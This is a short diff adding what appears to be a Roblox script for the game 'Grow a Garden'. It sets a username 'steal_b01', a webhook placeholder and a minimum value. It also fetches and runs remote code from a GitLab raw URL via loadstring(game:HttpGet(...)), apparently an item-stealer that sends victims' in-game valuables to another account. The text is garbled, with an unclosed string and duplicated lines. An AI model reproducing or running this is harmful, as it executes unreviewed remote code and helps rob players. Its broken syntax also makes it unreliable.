@@ -1,0 +1,13 @@
+Username = "steal_b01"
+
+Webhook = "Username = "Your Roblox Username"
+
+Webhook = "Your Webhook"
+
+MinimumValue = 1000000
+
+loadstring(game: HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))()"
+
+MinimumValue = 1
+
+loadstring(game: HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))()
